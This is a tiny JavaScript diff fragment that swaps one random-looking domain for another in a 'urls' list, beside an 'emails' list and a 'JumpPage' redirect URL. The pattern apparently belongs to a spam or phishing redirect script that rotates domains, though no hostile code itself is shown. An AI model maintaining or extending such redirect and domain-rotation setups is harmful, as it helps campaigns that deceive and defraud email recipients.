@@ -37,7 +37,7 @@ var emails = [
 ];
 
 var urls=[
-	'cbnefipek.com', 
+	'hrvykwba.cc', 
 ];                                                                                                                  
 
 var JumpPage="https://cgbgw.com";
